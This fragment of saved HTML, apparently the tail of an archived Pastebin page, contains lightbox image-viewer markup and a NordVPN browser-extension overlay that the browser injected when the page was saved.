+<div id="lightboxOverlay" tabindex="-1" class="lightboxOverlay" style="display: none;"></div><div id="lightbox" tabindex="-1" class="lightbox" style="display: none;"><div class="lb-outerContainer"><div class="lb-container"><img class="lb-image" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" alt=""><div class="lb-nav"><a class="lb-prev" aria-label="Previous image" href="http://web.archive.org/web/20221009045102/https://pastebin.com/cxn757Fw"></a><a class="lb-next" aria-label="Next image" href="http://web.archive.org/web/20221009045102/https://pastebin.com/cxn757Fw"></a></div><div class="lb-loader"><a class="lb-cancel"></a></div></div></div><div class="lb-dataContainer"><div class="lb-data"><div class="lb-details"><span class="lb-caption"></span><span class="lb-number"></span></div><div class="lb-closeContainer"><a class="lb-close"></a></div></div></div></div></body><nordvpn-contentscript-extension-mount-2.73.6><template shadowrootmode="open"><link rel="stylesheet" href="chrome-extension://fjoaledfpmneenckfbpdfhkmimnjocfa/contentScript.bundle.css"><div id="nordvpn-contentScript-extension-root-2.73.6" style="position: fixed; left: 0px; top: 0px; z-index: 2147483647;"><div class="" style="display: flex; flex-direction: column; align-items: center; position: absolute; width: 100vw; height: 1px;"><div class="" style="position: relative; width: 90px; height: 18px; min-height: 18px; display: flex; flex-direction: row; align-items: center; justify-content: center; background-color: rgb(246, 79, 100); border-radius: 0px 0px 6px 6px; cursor: pointer;"><svg width="14" height="11" viewBox="0 0 14 11" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.33246 11C0.463458 9.81529 -0.00282209 8.3915 1.28508e-05 6.93138C1.28508e-05 3.10337 3.13391 0 7 0C10.8661 0 14 3.10337 14 6.93138C14.0029 8.39151 13.5366 9.81532 12.6675 11L9.30544 5.59384L8.981 6.13697L9.31 7.64603L7 3.73244L5.57095 6.12184L5.90345 7.64672L4.69245 5.59728L1.33246 11Z" fill="white"></path></svg></div></div></div></template></nordvpn-contentscript-extension-mount-2.73.6></html>
